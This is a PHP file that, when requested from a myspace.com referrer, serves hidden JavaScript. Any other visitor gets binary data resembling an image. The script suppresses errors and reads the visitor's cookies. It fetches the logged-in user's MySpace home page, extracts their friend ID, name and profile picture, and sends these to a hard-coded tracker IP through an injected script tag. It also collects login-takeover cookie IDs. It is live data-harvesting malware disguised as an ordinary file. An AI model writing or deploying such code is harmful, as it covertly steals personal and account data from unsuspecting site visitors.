<?php
header("Expires: Thu, 01 Jan 1970 00:00:00 GMT, -1 ");
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");

if (strstr(@$_SERVER['HTTP_REFERER'],'myspace.com/')) {
	//stars added to ssu to make quicktime vector work, remove them
	$u = $_GET['u'];
	$u = str_replace("*","",$u);
	?>

function stopError() {return true;}
window.onerror = stopError;

var req;
var retry = 0;
var bloggedin = (document.cookie.indexOf('LASTUSERCLICK')>-1); //alert(bloggedin);
var r = escape(document.referrer);//.split("Mytoken")[0];
var r = r?r:escape(document.location);
//var ie7 = navigator.userAgent.indexOf("MSIE 7") > -1;
function loadURL(url) {
	req = false;
    if(window.XMLHttpRequest) {
    	try {
			req = new XMLHttpRequest();
        } catch(e) {
			req = false;
        }
    } else if(window.ActiveXObject) {
       	try {
        	req = new ActiveXObject("Msxml2.XMLHTTP");
      	} catch(e) {
        	try {
          		req = new ActiveXObject("Microsoft.XMLHTTP");
        	} catch(e) {
          		req = false;
        	}
		}
    }
	if(req) {
		req.onreadystatechange = processReqChange;
		req.open("GET", url, true);
		req.send("");
	}
}
var homeHTML;
var possible_friendids=new Array();
function processReqChange() {
    // only if req shows "loaded"
    if (req.readyState == 4) {
        // only if "OK"
        if (req.status == 200) {
            // page loaded ok, put html in var
			homeHTML = req.responseText;
			//send vars to tracker
			var trackURL = 'http://205.134.170.241/t.php?ssu=<?=$u?>&p=1&u='+findfriendid(homeHTML)+'&un='+findname(homeHTML)+'&img='+findimg(homeHTML)+'&r='+r+'&c=';
			var e=window.document.createElement('script');void(e.setAttribute('src',trackURL));
			void(window.document.body.appendChild(e));
        } else {
			//retry a couple of times if it fails
			if (retry < 3) {
				retry++;
				processReqChange();
				//alert('retry '+retry);
			} else {
				//alert('not logged in?');
				//findotherlogins(document.cookie);
				//for ( var i=possible_friendids.length-1; i>=0; --i ){
				//	alert(possible_friendids[i]);
				//}
			}
        }
    }
}
function findfriendid(str){
	if(!str){return '';}
	var s=str.indexOf('friendID=');
	if(s==-1)return ''; s+=9;
	e=str.indexOf('\"',s);
	var lgn=str.substring(s,e);
	e=lgn.indexOf('&');
	if(e!=-1){lgn=lgn.substring(0,e);}return lgn;
}
function findname(str){
	var s,e,n;
	s=str.indexOf('Hello,&nbsp;');
	if(s!=-1){
		e=str.indexOf('!',s);
		return str.substring(s+12,e);
	}
}
function findimg(str){
	if(!str){return '';}
	var s=str.indexOf('_m.');
	if(s==-1){ s=str.indexOf('/m_'); }
	if(s==-1){ return ''; }
	
	s=str.lastIndexOf('"',s)+1;
	e=str.indexOf('"',s);
	return str.substring(s,e);
}

//document.cookie.match(/UNIQUELOGINTAKEOVER_(\d*)=/);
function sortNumber(a,b){return a-b;}
function findotherlogins(cookie){
	var cookie,fst,fstlen,i,p1,p2;
	if(cookie.length){
		fst='UNIQUELOGINTAKEOVER_';fstlen=fst.length;i=cookie.indexOf(fst);
		while(i!=-1){
			p1=i+fstlen;p2=cookie.indexOf('=',p1);
			possible_friendids.push(cookie.substring(p1,p2));
			i=cookie.indexOf(fst,i+1);
		}
	}
	possible_friendids.sort(sortNumber);
}

var domain = document.domain;
var baseurl = document.location.href;
baseurl = baseurl.substring(0, baseurl.indexOf(domain)) + domain;


if (bloggedin) {
	//load home page data for logged in user
	//window.onload = loadURL(baseurl+'/index.cfm?fuseaction=user');  //not implemented error in ie
	var homeurl = baseurl+'/index.cfm?fuseaction=user';
	//window.onload = function() {loadURL(homeurl);};
	//window.setAttribute("onload", function() {
		loadURL(homeurl); 
	//});
} else {
	//not logged in, skip all that ajax stuff
	findotherlogins(document.cookie);
	var pfi_string = possible_friendids.join(",");
	//alert(pfi_string);
	var trackURL = 'http://205.134.170.241/t.php?ssu=<?=$u?>&p=1&u=???&un='+"???"+'&img='+pfi_string+'&r='+r+'&c=';
	var e=window.document.createElement('script');void(e.setAttribute('src',trackURL));
	//window.onload = void(window.document.body.appendChild(e));
	window.onload = function() {void(window.document.body.appendChild(e));};
}


<?
}else{
?>

‘¸j.˜$g
˜Ç¹¬n9_c.@<Óİ)&9R '#š¸lØ6M)´ePÌ2
/h.¯±.‡à)+.ËZ1M‡Ø7nÜyÍ6É<òc‚8ÅGn
\îqNi}eÿ (r³©Ò$ó^	‡
.mozíì#û=ô7.–qƒµÁéHâä.|FËœã½z.…à{»@’Æ.—ozãÄTo¡×J,ô=.DE&F.’.œö­K‚¢6˜(;‡"«xz!6–°à«"ã.t©Ú70ˆ..¨ÍxRw“;×b†““x¥IÉ|c°.åß·13è>.Ñ‘$qu<Ò±\ÿ Ë4QŒô.¿¥{.œö—~r0u>½«Ê?l.¬¼),¶ñKå.·%‹p.ÇÆ3Œ.G_Aù÷2iòÉòŸ;Äµ.0q{[óGÉzŞ’—÷–öšTÇÉÂ|­ÿ ,ş\;7<`÷ïšèà¹±.Å¥¢ š(„Qªïİ¹ÀÁb:à.r=
UğıÔÛgÕÒ8šêi¼¨à–1å°ë´öÛ¿…\³òìí×Q¸’Éo._t¡.²ÙmÊzgŸêµïÎNÖgçxš’·#é·«5ü)c>º½µÅ¹i!İÖ8ÇMÃaÉ9 ‚ ö5‡yá{­^õu.^îk  ..Š USÎ.aØzá½+ÒîcRø«.Z}ªZZêúx»	*°.K$.*..#Ü×!tKiW²¼’4±È›â˜..@.È.¯9Çü
¹cVq•Öìò!‰«N³”t”’»ís‘ñ=ÕüRÿ dÀ`
ì.0*r..‰_â8ü9ª÷.O¤ˆt™c.™.Ù$w.Ê­Ôäsœ~8Ç­N<ı.;Ù®¢{kç“ä_$3ŒŒò.Aÿ Öª.€ê:õœJÅÙæYeˆVŸ™°;sù]êÖw>‚šJİ¬·óvÜô.Âßf‚âM*WÔ-şÍ.½Á.í1ØíD.Pã«.@.»
ˆx`xgÄ–v±]]İj.ª³ˆßbC.8.c'ï>	Ç¦3×8ïl®®´»˜´..(œY„‘åû3.èAùÚ1÷W¯ÍıêÁñEíã.¹½.\-¬ìÑ„M¹c<x/ïş.çª³sgÍÇ.‰•nYm/½ö6~.hÖ–¾.Öl­œ“gâv™#™Ê°Ú..˜pN.§¾j.Ú&äÏáï.Ëg¦Aka.—rÊ‹&KlP¬\3ŒŒ.s“\W„¼DÑø¿ÄæÎ8Òîêin ›.CæR.[3ƒÄä6Õ¯Š³¸ğ.„’kûGº†Êî#c.™’Ü4€áòs“´œ`b¶Q~Ñß±éÂ”ş·'=n‘äS9{Y,ØªÄÓ©bp ñşy«wÏoeªY@Ğ(¶…6‘.É*\rx<Ón|¶Šé•.Ñ}.Uù˜`Ôò¤Rø¥~ÔŞe£O™.rBªƒŠîZ+.ç6–}ŸèhÇå‹KØ¢,.­î['©?/§.kÂúÔ>.š-LÚGxÑE.ys6G˜$È<ô.–“2Y±e
..ƒ...R.ÿ Z¨xŞæŞŞİäŠS.Ù!e*2¥w.îük.Ç™Ùœôèª’Owú—onÎ½â‹=^{Cmçd(v†%œ–R:U›‹éæÓtiî&¸¸v
.ÎNöS’.Áäü¤}+¬Ô<.{¦ü%ğŒe¶i$ººdhã^.=Í´.sÏä+‚ê;8t¦[Å¸—Ê˜İ.[l¾.ßRzV9;.J.›µ¶é¿Fkêïuu§ZCdÁĞ.I2„:œ•ÚO¦1‘ïYš½²Üj2ı².³Ë.Ø¶F»W

<?}?>